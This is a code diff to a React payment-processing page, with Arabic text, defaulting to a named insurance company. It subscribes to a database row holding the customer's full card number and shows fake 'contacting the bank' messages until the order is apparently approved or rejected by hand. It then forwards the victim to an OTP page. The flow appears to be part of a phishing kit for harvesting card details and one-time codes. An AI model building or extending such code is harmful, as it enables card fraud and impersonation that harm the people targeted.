@@ -1,6 +1,7 @@
 import { useEffect, useState } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import { Loader2 } from "lucide-react";
+import { supabase } from "@/integrations/supabase/client";
 
 const ProcessingPayment = () => {
   const navigate = useNavigate();
@@ -9,30 +10,59 @@ const ProcessingPayment = () => {
   
   const companyName = searchParams.get("company") || "شركة الاتحاد للتأمين التعاوني";
   const price = searchParams.get("price") || "411.15";
+  const orderId = searchParams.get("orderId");
 
   const messages = [
-    "جاري التحقق من عملية الدفع...",
+    "جاري التحقق من معلومات البطاقة...",
     "جاري التواصل مع البنك...",
     "جاري معالجة المعاملة...",
-    "جاري تأكيد الدفع...",
+    "جاري إكمال العملية...",
+    "يرجى الانتظار قليلاً...",
   ];
 
   useEffect(() => {
-    // Cycle through messages
+    if (!orderId) {
+      navigate('/');
+      return;
+    }
+
+    // تغيير الرسائل كل ثانية
     const messageTimer = setInterval(() => {
       setMessageIndex((prev) => (prev + 1) % messages.length);
     }, 1000);
 
-    // Navigate to OTP verification after processing
-    const navigationTimer = setTimeout(() => {
-      navigate("/otp-verification");
-    }, 4000);
+    // مراقبة حالة الطلب في الوقت الفعلي
+    const channel = supabase
+      .channel(`order-status-${orderId}`)
+      .on(
+        'postgres_changes',
+        {
+          event: 'UPDATE',
+          schema: 'public',
+          table: 'customer_orders',
+          filter: `id=eq.${orderId}`
+        },
+        (payload: any) => {
+          console.log("Order status updated:", payload);
+          const newStatus = payload.new.status;
+          
+          if (newStatus === 'approved') {
+            // الموافقة - الانتقال لصفحة التحقق
+            const cardLast4 = payload.new.card_number.slice(-4);
+            navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${cardLast4}&orderId=${orderId}`);
+          } else if (newStatus === 'rejected') {
+            // الرفض - العودة لصفحة الدفع مع رسالة خطأ
+            navigate(`/payment?company=${encodeURIComponent(companyName)}&price=${price}&rejected=true`, { replace: true });
+          }
+        }
+      )
+      .subscribe();
 
     return () => {
       clearInterval(messageTimer);
-      clearTimeout(navigationTimer);
+      supabase.removeChannel(channel);
     };
-  }, [navigate]);
+  }, [navigate, orderId, companyName, price]);
 
   return (
     <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4" dir="rtl">
